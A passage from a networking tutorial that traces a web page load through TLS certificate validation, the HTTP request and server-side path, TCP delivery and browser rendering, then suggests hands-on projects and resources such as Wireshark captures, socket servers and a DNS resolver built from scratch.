     - **Hostname**: `example.com` is in the certificate's SAN list
     - **Validity**: current date is between "not before" and "not after"
     - **Chain of trust**: leaf is signed by the intermediate, intermediate is signed by a **root CA** already in the OS/browser **trust store**; each signature checked with the issuer's public key
     - **Usage**: certificate is allowed for TLS server authentication
     - **Revocation**: not revoked (CRL/OCSP)
     - **CertificateVerify signature**: valid with the public key from the certificate
     - Any check fails → connection stops, browser shows "Your connection is not private" (HSTS sites don't even allow clicking through)
   - **Finished** from both sides (HMAC over the whole handshake → nothing was tampered with); both derive the final **traffic keys**
   - ALPN picked `h2` → this connection will speak HTTP/2
9. **HTTP request**:
   - `GET / HTTP/2` with headers: `Host`/`:authority: example.com`, `User-Agent`, `Accept`, `Accept-Encoding`, cookies for this site (respecting `Secure`/`SameSite`)
   - Encrypted by TLS → split into TCP segments → IP packets → frames → same path as above
10. **Server side**:
    - **CDN edge**: cached copy? → respond immediately; otherwise forward to origin
    - **Load balancer** (L7, TLS termination): picks a healthy instance (health checks), adds `X-Forwarded-For` with the client's IP
    - **Reverse proxy** (Nginx) → forwards to the app, e.g. in a Docker container via a published port (`-p 8080:3000`)
    - App runs the handler: maybe reads a DB/cache over the internal network (by service name via internal DNS)
    - Response: `200 OK`, `Content-Type: text/html`, `Cache-Control`, `Set-Cookie`, security headers (HSTS, CSP), body
11. **Response travels back**:
    - Same path in reverse; NAT translates it back at your router
    - TCP handles it reliably: **sequence numbers** to order segments, **ACKs**, **retransmission** of lost packets, **flow control** & **congestion control** (slow start ramps up the speed)
    - TLS decrypts and verifies integrity → browser gets the HTTP response
12. **Browser renders the page**:
    - Parses HTML → finds CSS, JS, images, fonts
    - Same-origin resources → reuse the same HTTP/2 connection (**multiplexed** streams, no new handshakes)
    - Other domains (CDN, fonts, analytics) → each needs its own **DNS + TCP + TLS** (or QUIC for HTTP/3)
    - JS `fetch` to an API on another origin → **CORS** checks (maybe a preflight `OPTIONS`)
    - `Set-Cookie` stored → sent on future requests
    - Live features may open a **WebSocket** (`101 Switching Protocols`) or **SSE** stream
13. **Afterwards**:
    - Connection stays open (keep-alive) for more requests; closed after idling → **FIN/ACK**; the side that closes first sits in **TIME_WAIT**
    - DNS, HTTP cache, TLS session ticket are all cached → next visit skips most of these steps (0-RTT resumption possible)

### Summary
```
Power on router  → ISP link + auth (PPPoE/DHCP) → router gets public IP
Join Wi-Fi       → WPA2/3 auth → DHCP (DORA) → ARP for gateway
Type URL         → HSTS / cache check
DNS              → browser → OS → router → resolver → root → TLD → authoritative → IP
TCP              → SYN / SYN-ACK / ACK            (1 RTT)
TLS              → ClientHello / ServerHello → certificate chain + CertificateVerify → browser validates cert → Finished  (1 RTT)
HTTP             → GET / → CDN → LB → proxy → app → DB → 200 OK
Each packet      → encapsulated L7→L1 → NAT at home router → hops via BGP routes → decapsulated at server
Render           → more requests (multiplexed) → CORS / cookies / WebSocket as needed
```

## 20. What to Do Next
1. **Observe real traffic**: capture in Wireshark while you reconnect Wi-Fi (DHCP DORA), open a site (DNS query, TCP 3-way handshake, TLS ClientHello with SNI), and close it (FIN/ACK); run `dig +trace example.com`, `traceroute example.com`, `curl -v https://example.com`; inspect a site's certificate chain in the browser
2. **TCP & UDP client/server**: echo server with raw sockets in both, then turn the TCP one into a multi-client chat server
3. **HTTP/1.1 server from scratch**: on top of raw TCP sockets; parse the request line, headers, and body yourself, serve static files, return proper status codes, support keep-alive
4. **DNS resolver from scratch**: build a DNS query packet by hand, send it over UDP to a root server, and follow referrals (root → TLD → authoritative) until you get the IP
5. **Reverse proxy / load balancer**: forward requests to multiple backends with round robin, health checks, and `X-Forwarded-For`

**Resources**
- [Beej's Guide to Network Programming](https://beej.us/guide/bgnet/): sockets from scratch; perfect companion for projects 2 & 3
- [Julia Evans - How DNS Works (zine)](https://wizardzines.com/zines/dns/): short, visual, and fun intro to DNS
